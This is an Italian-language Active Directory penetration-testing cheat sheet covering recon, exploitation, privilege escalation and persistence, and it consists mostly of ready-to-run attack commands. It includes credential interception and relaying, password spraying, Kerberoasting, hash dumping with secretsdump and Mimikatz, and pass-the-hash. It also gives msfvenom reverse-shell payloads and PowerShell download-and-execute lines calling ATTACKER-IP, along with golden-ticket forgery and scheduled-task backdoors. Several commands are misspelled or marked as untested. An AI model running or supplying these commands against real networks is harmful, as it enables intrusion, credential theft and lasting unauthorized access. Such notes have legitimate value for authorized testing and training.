# AD Hacking Methodology
*Notes on AD pentest*

# FASE 1 - RECONNAISSANCE / ENUMERATION

## Primi passi

1. Eseguo ***Responder***, lasciando attivo affinché rimanga in ascolto del traffico, al fine di intercettare qualche *hash*

```bash
sudo responder -I <INTERFACE> -dwv
```

Se intercetto un hash, posso tentare di crackarlo con ***hashcat***

```bash
hashcat -m 5600 <hashes.txt> <WORDLIST.txt>
```

2. Per lo stesso scopo, tento un attacco ***mitm6* (che ha sempre la sua validità) per massimo 10 minuti**, eseguendo in due schede diverse

```bash
impacket-ntlmrelayx -6 -t ldaps://<IP> -wh fakewpad.<DOMAIN.local> -l <NOME_CARTELLA>
```

```bash
sudo mitm6 -d <DOMAIN.local>
```

3. Eseguo una scansione con ***nmap*** per identificare, dominio, porte, servizi ed eventuali vulnerabilità

```bash
nmap -T4 -p- -sC -sV -Pn <IP>
```

4. Se dalla scansione emerge la vulnerabilità di smb “*signed required but not enabled*", possiamo effettuare un ***smb relay attack***. Mettiamo in *off* le voci *smb* e *http* in /etc/responder/Responder.conf, creiamo un file TARGETS.txt con gli indirizzi IP delle macchine vulnerabili e poi eseguiamo in due schede diverse:

```bash
sudo responder -I <INTERFACE> -dwv
```

```bash
sudo impacket-ntlmrelayx -tf <TARGETS.txt> -smb2support
```

5. Se vogliamo una shell interattiva con l’attacco appena eseguito, aggiungiamo una “**-i**” al comando: riceveremo in output un’IP ed una porta a cui connetterci con ***netcat***

```bash
nc <IP> <PORT>
```

6. Eseguo ***enum4linux-ng*** per un’enumerazione automatizzata ed approfondita, sia senza credenziali, sia con l’utente “guest” (spesso lasciato abilitato)

```bash
enum4linux-ng <IP>
```

```bash
enum4linux-ng -A -u ‘guest’ -p ‘’ <IP>
```

7. Per un’enumerazione specifica di smb eseguo:

```bash
smbclient -L //<IP> -N
```

oppure

```bash
smbmap -H <IP>
```

oppure

```bash
smbclient -U 'guest' //<IP>/<FOLDER>
```

8. Eseguiamo ***crackmapexec*** (o ***netexec***) senza credenziali e poi con l’utente *guest*

```bash
crackmapexec smb IP -u ‘’ -p ‘’ --shares
```

```bash
crackmapexec smb IP -u guest -p ‘’ --shares
```

```bash
crackmapexec smb IP -u ‘’ -p ‘’ --rid-brute
```

```bash
crackmapexec smb IP -u guest -p ‘’ --rid-brute
```

9. Se attraverso la scansione di ***nmap*** trovo periferiche (come stampanti o voip) con credenziali di default: cerco di collegarmi ed effettuare un ***passback attack***
    
    a) Cercare di entrare nell'EWS *(Embedded Web Service*, in altre parole, l'home page della stampante) → Spesso vengono lasciate le credenziali di *default* (facilmente recuperabili via internet);
    
    b) Modificare le impostazioni del server LDAP, inserendo, al posto del server legittimo, il nostro indirizzo IP;
    
    c) Avviare un listener con ***Netcat***
    
    ```bash
    nc -L -p 389
    ```
    
    c) La prossima volta che verrà eseguita una query LDAP dall'MFP, questa tenterà di autenticarsi al tuo server LDAP utilizzando le credenziali configurate o le credenziali fornite dall'utente;
    

Potremmo utilizzare anche:

- le impostazioni di accesso a Windows sostituendo il dominio esistente con il nostro dominio e la volta successiva che un utente del dominio accede al pannello di controllo, le credenziali vengono inviate al nostro controller di dominio,
- le impostazioni SMTP (La configurazione SMTP esistente per questa MFP ha archiviato credenziali per l'autenticazione SMTP che possono essere passate a noi, dopo aver sostituito il server SMTP esistente con il nostro server SMTP).

Vedere PRET (il Printer Exploitation Toolkit)

[https://github.com/RUB-NDS/PRET](https://github.com/RUB-NDS/PRET)

---

## Se trovo *shares* aperti

1. Cerco di collegarmi e aggiungo il *flag* ricorsivo per osservare già il contenuto senza esplorazione manuale

```bash
smbclient //<IP>/<DIR> -c 'recurse;ls'
```

2. Se vi sono file interessanti, posso accedere e recuperarli con “***get***”

```bash
smbclient //<IP>/<DIR>
```

```bash
get <FILE>
```

---

## Se trovo utenti (ma non password)

1. Posso sfruttare *crackmapexec* al fine di trovare eventuali password deboli, usando una buona wordlist

```bash
crackmapexec smb <IP> -u <USERS.txt> -p <WORDLIST.txt>
```

2. Posso provare un ***ASREProasting*** (funzionante nel caso in cui almeno uno degli utenti trovati abbia la *Kerberos pre-authentication disabled)*  e crackare l’*hash* intercettato con ***hashcat***

```bash
impacket-GetNPUsers <DOMAIN>/ -userfile <USERS.txt>
```

oppure

```bash
impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile <USERS.txt> -dc-ip <IP>
```

```bash
hashcat -m 18200 <hashes.txt> <WORDLIST>
```

---

## Se trovo password (ma non utenti)

1. Sebbene poco probabile, provo un *Password Spraying* su lista di common users con ***crackmapexec*** o ***netxec***

```bash
crackmapexec smb <IP> -u <USERSNAMES.txt> -p <PASSWORD>
```

---

## Se trovo utenti ed una sola password

1. Eseguo un *Password Spraying* con ***crackmapexec*** o ***netexec***

```bash
crackmapexec smb <IP> -u <UTENTI.txt> -p <PASSWORD>
```

Possiamo anche usare ***kerbrute***

```bash
kerbrute passwordspray --dc <IP> -d <DOMAIN> <USERS.txt> <PASSWORD>
```

---

# FASE 2 - EXPLOITATION (and some more Enumeration)

## Ho ottenuto delle credenziali

1. Eseguiamo ***crackmapexec*** (o ***netexec***) per una enumeration più approfondita, al fine di scovare altri utenti del dominio, ed eseguiamo un *“pass-the-password”* attack*,* o **un “*pass-the-hash*” nel caso in cui non fossimo riusciti a crackare password e  NTLM sia v1 , utilizzando le credenziali acquisite su tutte le macchine del dominio per identificare i dispositivi nei quali abbiamo accesso

```bash
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --users
```

```bash
crackmapexec smb <IP> -u <USER> -p <PASSWORD> –users –-rid-brute
```

oppure

```bash
crackmapexec smb <DOMAIN> -u <USER> -p <PASSWORD> –users –-rid-brute
```

Identifichiamo i computer a cui abbiamo accesso con le credenziali ottenute:

```bash
crackmapexec smb <IP/CIDR> -u <USER> -p <PASSWORD> –d <DOMAIN>
```

oppure

```bash
crackmapexec smb <IP/CIDR> -u <USER> -H <NTLMv1-HASH> --local-auth
```

E se abbiamo accesso alle macchine con l’utente “administrator”, possiamo procedere con un local samdump

```bash
crackmapexec smb <IP/CIDR> -u <USER> -H <NTLMv1-HASH> --local-auth --sam
```

e con uno share enumeration per tutte le macchine (sia con password che con hash)

```bash
crackmapexec smb <IP/CIDR> -u <USER> -H <NTLMv1-HASH> --local-auth --shares
```

nonché un *lsa dumping* (fattibile anche con *secretsdump*)

```bash
crackmapexec smb <IP/CIDR> -u <USER> -H <NTLMv1-HASH> --local-auth --lsa
```

e infine provare col modulo lsassy (se ci sono *secret* stored nella memory)

```bash
crackmapexec smb <IP/CIDR> -u <USER> -H <NTLMv1-HASH> --local-auth -M lsassy
```

2. Rieseguire gli attacchi della prima fase utilizzando tutte le credenziali ottenute

```bash
enum4linux-ng -A -u <USER> -p <PASSWORD> <IP>
```

```bash
smbmap -u <USER> -p <PASSWORD> -H <IP>
```

```bash
smbclient //<IP>/<cartella_accessibile> -U <DOMAIN>/<user>%<password>
```

3. Tentare un *ASReproasting* con le credenziali ottenute

```bash
netexec ldap <IP> -u <user> -p <password> --asreproast <asrep.txt>
```

4. Tentare un attacco *kerberoasting* con le credenziali ottenute

```bash
netexec ldap <IP> -u <user> -p <password> --kerberoast <kerb.txt>
```

oppure

```bash
impacket-GetUserSPNs <DOMAIN>/<user>:<PASSWORD> -dc-ip <IP> -request
```

5. Eseguire *secretsdump* per ottenere un dumping degli hash nel caso in cui l’utente abbia i privilegi adeguati (usando la password dell’utente o l’hash)

```bash
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

oppure se abbiamo l’hash NTLM dell’administrator (local admin)

```bash
impacket-secretsdump administrator:@<IP> -hashes <HASH>
```

usando hashcat per tentare il cracking (nel caso di NTLMv1, modulo 1000)

```bash
hashcat -m 1000 <ntlm.txt> <wordlist.txt>
```

6. Eseguire B***loodhound*** per analizzare le relazioni e i percorsi di attacco migliori

```bash
sudo bloodhound-python -d <DOMAIN> -u <USER> -p <PASSWORD> -ns <IP> -c all
```

```bash
sudo neo4j console
```

```bash
sudo bloodhound
```

*Importo in bloodhound i file json creati col primo comando*

7. Se desidero avere un report completo più chiaro, posso eseguire *Plumhound* abbinato a *Bloodhound* (che deve rimanere attivo assieme a neo4j) per poi analizzare i risultati

```bash
sudo python3 PlumHound.py -x tasks/default.tasks -p <NEO4JPASSWORD>
```

---

## Tentare l’accesso

1. Cerco una shell con ***psexec*** o ***evilwin-rm***

```bash
impacket-psexec <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

```bash
sudo evil-winrm -i <IP-TARGET> -u <USER> -p <PASSWORD>
```

2. Se abbiamo degli *hash* validi che non sono stati crackati possiamo cercare una shell sfruttando quelli e provare i ***pass-the-hash attac***k, eventualmente con l’utente “administrator”

```bash
impacket-psexec <USER>@<IP> -hashes <HASH>
```

```bash
sudo evil-winrm -i <IP> -u <USER> -H <hash>
```

3. Se ottengo una shell, posso vedere i privilegi dell’utente

```bash
whoami /priv
```

4. Provo il *sam dump,* al fine di recuperare gli hash degli utenti e ritentare gli attacchi

```bash
crackmapexec smb IP-RANGE -u administrator -H HASH --local-auth --sam
```

oppure

```bash
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

---

## Movimento laterale

1. Studio a fondo i grafici di ***bloodhound*** per capire come muovermi. Ad esempio
    1. Ho un utente con la proprietà ***ForceChangePassword*** su un altro utente: cambio la password dell’altro utente, accedo col suo account e mi muovo da lì
    
    ```bash
    net rpc password <"NEW_USER"> <"newPass"> -U <DOMAIN>/<USER<%<PASSWORD> -S <IP>
    ```
    
    oppure
    
    ```bash
    bloodyAD -u <USER> -p <PASSWORD> -d <DOMAIN> --host <IP> set password <UTENTE_2> <NEWPASSWORD>
    
    ```
    

b. Sono già in possesso di una password che, tuttavia, l’utente deve cambiare obbligatoriamente al primo accesso (altrimenti non è possibile ottenere una shell), provo a cambiarla con *smbpasswd*

```bash
smbpasswd -r <IP> -U <USER>
```

c. Ho un utente con la proprietà ***DCSync***: posso fare il *dump* del *sam* con un *DCSync attack* e crackare gli hash o effettuare un *pass-the-hash attack,* particolarmente efficace nel caso trovassimo l’*hash* dell’administrator

```bash
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

```bash
impacket-psexec administrator@<IP> -hashes <HASH>
```

oppure

```bash
sudo evil-winrm -i IP-TARGET -u <USER> -H <HASH>
```

d. Ho un utente con la proprietà ***GenericWrite*** su un altro utente: possiamo effettuare un *targeted kerberoasting attack* (valido anche in caso di proprietà *WriteOwner, GenericAll, WritePropriety, Validated-SPN,* o *WriteProprieties*)

```bash
python targetedKerberoast.py -u <"USER"> -p <"PASSWORD"> -d <"DOMAIN"> --dc-ip <IP>
```

oppure

```bash
python targetedKerberoast.py -v -d <domain> -u <user> -p <pass> --request-user <requested_user> -o <output.kerb>
```

e. Se abbiamo un “***kerberoastable account***”, possiamo tentare un *kerberoasting attack* e crackare la password con hashcat

```bash
impacket-GetUserSPNs <DOMAIN>/<user>:<password> -dc-ip <DC_IP> -request
```

oppure semplicemente

```bash
impacket-GetUserSPNs <DOMAIN>/<user>:<password> -outputfile <FILENAME>
```

oppure

```bash
netexec ldap <IP> -u <'username'> -p <'password'> --kerberoast <output.txt>
```

```bash
hashcat -m 13100 hash.txt <WORDLIST.txt>
```

oppure

```bash
john --wordlist=<WORDLIST.txt> --fork=4 --format=krb5tgs <kerberos_hashes.txt>
```

f. Ricordiamoci, in caso di errore durante un attacco *kerberoasting*, di settare il *time* corretto con la macchina target

```bash
sudo ntpdate <DOMAIN>
```

oppure

```bash
sudo ntpdate -s <DOMAIN>
```

g. Se l’utente compromesso ha dei privilegi oltre al dumping del sam per un eventuale *privilege escalation*, possiamo provare un *token impersonation* con Metasploit

```bash
sudo msfconsole

use exploit/windows/smb/psexec

set payload windows/x64/meterpreter/reverce_tcp

set rhosts <IP_TARGET>    # *la macchina deve essere attiva*

set smbuser <USER>

set smbpass <PASSWORD>

set smbdomain <DOMAIN>    # A meno che non stiamo accedendo come 'administrator': in tal caso lasciamo '.'

run

```

Ottenuta la sessione *meterpreter*, procedo in questo modo

```bash
load incognito

list_tokens -u

impersonate_token <DOMAIN>\\<user> 
```

Col comando “shell”, se tutto va bene, scopriamo di essere quell’utente.

Per tornare indietro:

```bash
rev2self
```

---

# FASE 3 - PRIVILEGE ESCALATION

## Winpeas

Una volta ottenuta una shell, possiamo caricare ***winpeas.exe*** sulla macchina target, eseguirlo, e analizzarne i risultati per tentare un *Privilege Escalation*.

Se abbiamo una shell con evilwin-rm, possiamo usare il comando “upload”.

Altrimenti possiamo usare un semplice server http in Python lato attaccante e *curl* lato target

*Attacker*

```bash
python -m http.server <PORT>
```

*Target*

```powershell
curl -O http://<ATTACKER-IP>:<PORT>/winpeas.exe
```

oppure

```powershell
certutil.exe -urlcache -f http://<ATTACKER-IP>:<PORT>/winpeas.exe
```

---

## LNK file attack

L'attacco è da effettuare se siamo riusciti ad ottenere una shell in una macchina target di un utente nel domain ed è eseguibile nel caso vi sia una cartella condivisa accessibile in rete. Usiamo “*powershel*l”

```powershell

$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\<ATTACKER-IP\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

Collochiamo il link creato nella cartella condivisa facendo in modo che sia il più "in alto" possibile (ecco il perché della @ nel nome).

Eseguiamo *Responder* sulla nostra macchina

```bash
sudo responder -I eth0 -dP  *# su -I mettiamo l'interfaccia di rete (di solito è eth0, ma è bene verificare con ifconfig)*
```

Non appena un utente entra nella cartella condivisa, riceveremo gli hash

Nel caso in cui gli shares siano esposti, è possibile automatizzare il processo utilizzando *NetExec*:

```bash
netexec smb <IP> -d <DOMAIN> -u <USER> -p <PASSWORD> -M slinky -o NAME=test SERVER=<ATTACKER-IP>
```

---

## Unquoted Service Path

Ottenuta una shell in una macchina target, assicuriamoci di utilizzare *powershel*l.

Identifichiamo i servizi con startup automatico usando il seguente comando:

```powershell
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
```

Verifichiamo i dettagli del servizio e la possibilità di scrivere nella sua cartella usando il cmd

```bash
cmd

sc qc <“SERVIZIO”>

icacls <“C:\SERVICE_PATH”>
```

Creiamo un payload con msfvenom, e gli diamo come nome la prima parte del nome della cartella.

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> LPORT=<LISTENING_PORT> -f exe -o <DIR_NAME.exe>
```

Lo trasferiamo nella cartella specifica della macchina target.

Avviamo un *listener* (con Metasploit o Netcat).

```bash
sudo msfconsole

use exploit/multi/handler

set LHOST <ATTACKER_IP>

set LPORT <LISTENING_PORT>

run
```

oppure

```bash
nc -lvnp <LISTENING_PORT>
```

All’avvio successivo della macchina (o del processo) otteremo una shell da amministratore.

---

## Metasploit Exploit Suggester

Eseguire il modulo *exploit suggester* su una macchina già compromessa con una sessione meterpreter

```bash
meterpretr > run 𝚙𝚘𝚜𝚝/𝚖𝚞𝚕𝚝𝚒/𝚛𝚎𝚌𝚘𝚗/𝚕𝚘𝚌𝚊𝚕_𝚎𝚡𝚙𝚕𝚘𝚒𝚝_𝚜𝚞𝚐𝚐𝚎𝚜𝚝𝚎𝚛
```

Lo script analizzerà il target alla ricerca di vie percorribili (e relativi moduli post compromise) per un *Privilege Escalation*

---

## Scheduled Task

Specifico exploit di Metasploit

```bash
sudo msfconsole

use exploit/windows/local/scheduled_task

set payload windows/x64/meterpreter/reverse_tcp

set LHOST <IP>

set LPORT <PORT>

run
```

Posso anche abusare di un *task* già esistente legato all’amministratore per elevare i miei privilegi dopo aver ottenuto una sessione meterprter su una macchina target senza privilegi

```bash
meterpreter > run schtaskabuse -t "<NomeDelTask>" -c "powershell -Command 'IEX (New-Object Net.WebClient).DownloadString(\"http://<IP>/payload.ps1\")'"
```

---

## Pass-the-hash

Se abbiamo compromesso un utente con privilegi, possiamo estrarre gli hash mediante un dumping

```bash
impacket-secretsdump <DOMAIN>/<user>:<'PASSWORD'>@IP
```

Se otteniamo l’hash dell’amministratore, possiamo eseguire nuovamente il comando per ottenere il sam dump completo

```bash
imapacket-secretsdump administrator@<IP> -hashes <HASH>
```

Se vogliamo solo l’hash NTLM del DC possiamo eseguire

```bash
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<IP> -just-dc-ntlm
```

Infine, possiamo tentare di ottenere una shell mediante un *pass-the-hash* senza necessità di crackare gli hash

```bash
impacket-psexec administrator@<IP> -hashes <ADMIN_HASH>
```

oppure

```bash
sudo evil-winrm -i <IP> -u administrator -H <ADMIN_HASH>
```

---

## Token impersonation

Abbiamo già visto questo attacco nella fase del *lateral movement*. 

Possiamo ottenere un *privilege escalation* all’interno della sessione meterpreter, dopo aver fatto “load incognito”

```bash
impersonate_token <DOMAIN>\Administrator
```

E possiamo creare un nuovo account con privilegi di amministratore, in modo da mantenere l’accesso

```bash
net user /add <NEW_USER_NAME> <PASSWORD> /domain
```

Possiamo avere conferma dell’avvenuta creazione mediante

```bash
impacket-secretsdump <DOMAIN>/<NEW_USER_NAME>:<PASSWORD>@<IP>
```

---

## Mimikatz

Ottenuta una shell in una macchina target, con utente con privilegi, possiamo caricare mimikatz.exe al fine di estrarre l’hash dell’amministratore e fare quindi un pass the hash con lo stesso mimikatz o con psexec

```bash
mimikatz.exe

privilege::debug

sekurlsa::logonpasswords
```

Se otteniamo l’hash NTLM che ci interessa, possiamo procedere col pass-the-hash

```bash
sekurlsa::pth /user:Administrator /domain:<DOMAIN> /ntlm:<HASH>
```

oppure

```bash
impacket-psexec -hashes 00000000000000000000000000000000:<HASH> administrator@<IP>   # Dove gli “0” indicano l’NT nullo, e l’hash l’LM 
```

---

# FASE 4 - COMPLETE ACCESS

## Golden Ticket

Eseguiamo un Golden Ticket Attack con mimikatz dopo aver compromesso il DC

```bash
mimikatz.exe

privilege::debug

lsadump::lsa /inject /name:krbtgt
```

Prendiamo il SID del dominio e l’NTLM del krbtgt, infine generiamo il GT con

```bash
kerberos::golden /User:Administrator /domain:DOMAIN.local /sid:<SID_INDIVIDUATO_SOPRA> /krbtgt:<HASH_NTLM> /id:500 /ptt
```

E apriamo il prompt con

```bash
misc::cmd
```

Possiamo eseguire qualsiasi comando su qualsiasi macchina del dominio.

Esempio:

```bash
dir \\<MACCHINA_TARGET>\c$
```

Possiamo anche utilizzare *psexec* sulla macchina target per un completo controllo della shell

```bash
psexec.exe \\<MACCHINA_TARGET> cmd.exe
```

Un’altra via per ottenere un ***Golden Ticket*** è la seguente:

- Otteniamo una shell con evil-winrm sulla macchina target;
- Carichiamo nella memoria della macchina target, mediante una shell evil-winrm con privilegi, Invole-mimikatz

```bash
iex(new-object net.webclient).downloadstring('http://<ATTACKER_IP>:<PORT>/Invoke-Mimikatz.ps1')
```

- Usiamo invoke-mimikatz per un targeted DC-Sync attack contro un krbtgt user per estrarre il KRBTGT AES hash (nel caso non lo avessi mo già ottenuto con secretsdump)

```bash
Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /user:krbtgt /domain:<DOMAIN>"'
```

- Identifichiamo il SID del domain, che possiamo trovare nella scansione di enum4linux-ng, oppure possiamo cercarlo manualmente con

```bash
impacket-lookupsid <DOMAIN>/<user>@<machine.domain> -domain-sids
```

- Possiamo creare il nostro Golden Ticket

```bash
impacket-ticketer -aesKey <aesKey> -domain-sid <sid> -domain <DOMAIN> administrator
```

- Lo carichiamo in memoria

```bash
export KRB5CCNAME=./administrator.ccache
```

- Ci connettiamo al target usando il Golden Ticket con psexec

```bash
impacket-psexec -k -no-pass <machine>.<domain>
```

---

## Maintaining Access

1. Creare un account con privilegi (la via privilegiata)

```bash
net user /add <NEW_USER_NAME> <PASSWORD> /domain
```

2. Usare i moduli Metasploit dedicati

```bash
run persistence -h

exploit/windows/local/persistence

exploit/windows/local/registry_persistence
```

3. Creare un scheduled task, o con Metasploit o manualmente

*Task che eseguirà un payload Meterpreter su base pianificata*

```bash
run post/windows/manage/scheduleme
```

Esempio nella sessione meterpreter (da testare)

```bash
meterpreter > run scheduleme -p windows/x64/meterpreter/reverse_tcp -h <IP> -P <PORT>
```

*Abusare di un task pianificato già esistente* 

```bash
run schtaskabuse
```

Esempio nella sessione meterpreter (da testare) sfruttando un payload di Powershell

```bash
meterpreter > run schtaskabuse -t "<NomeDelTask>" -c "powershell -Command 'IEX (New-Object Net.WebClient).DownloadString(\"http://<IP>/payload.ps1\")'"
```

Creare un task manualmente con *schtasks* sulla macchina compromessa (da testare)

*Reverse Shell ogni minuto*

```bash
schtasks /create /sc MINUTE /mo 1 /tn "BackdoorTask" /tr "C:\Windows\System32\cmd.exe /c C:\backdoor.exe" /ru SYSTEM

```

*Eliminazione del task quando non serve più*

```bash
schtasks /delete /tn "BackdoorTask" /f
```

Differenze fra i moduli Metasploit citati

![image](https://github.com/user-attachments/assets/c85c83e1-dee3-4ffd-9489-a611e4a311e1)
